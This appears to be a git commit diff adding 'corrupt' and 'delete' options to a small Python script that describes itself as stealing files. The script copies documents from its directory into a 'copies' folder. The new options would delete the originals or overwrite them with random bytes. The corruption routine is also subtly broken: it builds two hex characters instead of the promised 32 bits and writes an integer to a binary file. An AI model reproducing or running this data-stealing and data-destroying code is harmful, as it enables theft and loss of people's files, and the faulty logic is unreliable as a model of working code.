40a2b42c03cb995e9d7c693b81e55fc09737bfa2
MananaTheOne <92143676+MananaTheOne@users.noreply.github.com>
2021-10-16 20:12:31 +0800

    corruption & deletion update, main.py
    Corrupt and delete are added options

--- main.py
+++ main.py
@@ -1,5 +1,29 @@
-import os
+"""
+Made By Manana.
 
+This program steals your files.
+and does nothing but just copy it in a folder.
+"""
+import os
+import random
+
+datalist = "1234567890abcdef"
+
+"""
+NOTE :
+    Setting this to True
+    will delete the file upon copy
+    so it means it just cut + pastes it.
+"""
+delete_on_copy = False
+
+"""
+NOTE :
+    Setting this to True
+    will override the file on copy
+    it means it will replace the content with a random 32-bit data.
+"""
+corrupt_on_copy = False
 # All File Extensions, You Can Replace It If You Want.
 file_extensions = [
     '.pdf',
@@ -26,5 +50,14 @@ for i in os.listdir(): # Lists all the files in the directory where the python f
             with open(i, "rb") as file: # Opens the file
                 contents = file.read()
                 filename = i.split("/")[-1] # Gets the filename by splitting the directory to a list and getting the last entry.
+            if corrupt_on_copy:
+                x = 0
+                randomdata = ""
+                while not x == 2 :
+                    x+=1
+                    randomdata+=random.choice(datalist)
+                randomdata = eval(f"0x{randomdata}")
+                with open(filename, "wb") as file:
+                    file.write(randomdata)
             with open(f"copies/{filename}", "wb") as copy: # Opens the contents of file and writes it as a copy
                 copy.write(contents)
